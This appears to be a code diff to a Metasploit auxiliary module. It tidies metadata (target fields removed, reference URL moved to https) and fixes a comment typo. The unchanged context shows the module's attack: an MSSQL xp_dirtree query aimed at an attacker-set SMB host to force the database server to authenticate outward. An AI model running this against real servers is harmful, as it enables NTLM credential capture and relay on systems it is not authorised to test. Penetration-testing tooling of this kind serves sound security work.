@@ -30,12 +30,7 @@ class MetasploitModule < Msf::Auxiliary
           'Antti <antti.rantasaari[at]netspi.com>'
         ],
       'License'        => MSF_LICENSE,
-      'Targets'        =>
-        [
-          [ 'Automatic', { } ],
-        ],
-      'DefaultTarget'  => 0,
-      'References'     => [[ 'URL', 'http://en.wikipedia.org/wiki/SMBRelay' ]]
+      'References'     => [[ 'URL', 'https://en.wikipedia.org/wiki/SMBRelay' ]]
     ))
 
     register_options(
@@ -56,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
     sql = "exec master..xp_dirtree '\\\\\\\\#{datastore['SMBPROXY']}\\#{rand_filename}'"
     print_status("Attempting to force backend DB to authenticate to the #{datastore['SMBPROXY']}")
 
-    # Execute query to force authentation from backend database to smbproxy
+    # Execute query to force authentication from backend database to smbproxy
     mssql_query(sql)
   end
 end
